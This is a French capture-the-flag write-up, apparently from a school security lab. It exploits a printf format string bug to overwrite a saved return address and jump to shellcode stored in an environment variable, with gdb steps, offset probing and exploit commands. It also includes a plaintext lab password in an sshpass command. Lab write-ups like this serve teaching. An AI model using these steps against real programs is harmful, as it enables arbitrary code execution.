# Level 05

Lorsqu'on exécute le binaire, un input est attendu sur l'entrée standard. Il est ensuite réaffiché sur la sortie standard. Si des majuscules sont entrées, elles sont mises en minuscule.

On peut réécrire un code source en C à partir du code asm du binaire :

```c
int main(int argc, const char **argv)
{
	char buffer[100]; // esp+0x28
	int i;			  // esp+0x8c

	i = 0;
	fgets(buffer, 100, stdin);

	int i = 0;
	while (i < strlen(buffer)) // not really a call to strlen function
	{
		if (buffer[i] >= 'A' && buffer[i] <= 'Z')
			buffer[i] = buffer[i] - 'A' + 'a'; // buffer[i] ^ 0x20
		i++;
	}
	printf(buffer);
	exit(0);
}
```

On voit rapidement qu'on peut utiliser une **format string attack** puique la fonction **printf** est appelée avec comme 1er argument le buffer dans lequel on écrit.

Grâce au specifier `%n` on va pouvoir écrire dans la mémoire. On peut donc écraser l'**eip sauvegardé** de la fonction **printf** pour pouvoir jump à un endroit où on aura insérer un shellcode.

On ne peut pas vraiment insérer notre shellcode dans le buffer puisque, tous les octets compris entre 'A' et 'Z' seront modifiés. Cependant, on peut introduire notre shellcode dans une variable d'environnement.

Notre but est donc d'écraser l'**eip sauvegardé** de la fonction **printf** par l'adresse de la variable d'environnement qui contient notre shellcode.

Il nous faut trouver ces deux adresses. On commence par introduire notre shellcode dans la variable d'environnemment `SCRIPT` :

```bash
export SCRIPT="$(cat /tmp/args/env_var)"
```

Ensuite dans gdb on place un breakpoint au niveau du printf, puis on rentre dans la fonction pour récupérer l'**eip sauvergardé** :

```gdb
b *0x8048507
r
*on écrit ce qu'on veut pour l'entrée standard*
si
i f
```

Avec la commande `i f` (info frame), on peut lire sur la dernière ligne la valeur de l'adresse.

Pour récupérer l'adresse de notre variable d'environnement `SCRIPT` on peut faire comme-ci dessous avec gdb peda :

```gdb
b main
r
find "SCRIPT"
```

Maintenant que nous avons nos deux adresses il faut construire notre _format string_.

En utilisant cette commande :

```bash
$ echo "aaaaaaaaaaaaaaaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
aaaaaaaaaaaaaaaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd4e4 f7fdb000 61616161 61616161 61616161 61616161 78252061
```

On se rend compte que notre début de string est écrit dans la stack qu'à partir du dixième argument. On peut donc utiliser la format string suivante : `ADDR %WIDTHx %10$n`, avec _ADDR_ qui correspond à l'adresse où l'on veut écrire donc l'**eip sauvegardé** et _WIDTH_ l'adresse où se situe notre shellcode.

Cependant l'adresse où se sitre notre shellcode, étant assez grande, la _width_ est trop grande et pas prise en compte. Même en ayant 4 arguments de la _width_ divisé par 4, cela ne marche pas.

Pour palier à ce problème, on va écrire les 2 octets les plus bas de notre adresse à l'**eip sauvegardé** et les 2 octets les plus haut à l'**eip sauvegardé + 2**. On obtient donc : `ADDR ADDR+2 %WIDTH1x %10$n %WIDTH2x %11$n`. Voir Ressources/generator.cpp.

## Commandes

Depuis l'hôte :

```bash
make && ./generator && sshpass -p '3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN' scp -P 4242 -r args level05@localhost:/tmp/
```

Sur la vm :

```bash
export SCRIPT="$(cat /tmp/args/env_var)"
./level05 < /tmp/args/arg
```

## Sources

- https://resources.infosecinstitute.com/topic/exploiting-format-strings-getting-the-shell/
